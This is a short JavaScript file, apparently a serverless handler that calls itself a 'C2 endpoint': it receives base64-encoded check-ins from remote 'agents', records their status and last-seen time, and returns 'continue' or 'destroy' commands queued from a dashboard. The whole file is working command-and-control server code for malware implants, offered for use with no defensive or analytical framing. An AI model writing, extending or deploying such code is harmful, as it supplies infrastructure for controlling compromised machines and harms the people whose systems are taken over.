// api/beacon.js - Serverless C2 endpoint
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { data } = req.body;
    
    // Store agent data (Vercel KV or simple in-memory for demo)
    const agents = global.agents || {};
    const agentData = JSON.parse(Buffer.from(data, 'base64').toString()); // Simple decrypt
    
    agents[agentData.agent_id] = {
      ...agentData,
      last_seen: new Date().toISOString(),
      status: 'active'
    };
    
    global.agents = agents;
    
    // Check for destroy command (from dashboard)
    const destroyAgents = global.destroyAgents || [];
    if (destroyAgents.includes(agentData.agent_id)) {
      destroyAgents.splice(destroyAgents.indexOf(agentData.agent_id), 1);
      global.destroyAgents = destroyAgents;
      return res.json({ command: 'destroy' });
    }
    
    res.json({ command: 'continue' });
  } catch (error) {
    res.status(500).json({ error: 'Processing failed' });
  }
}
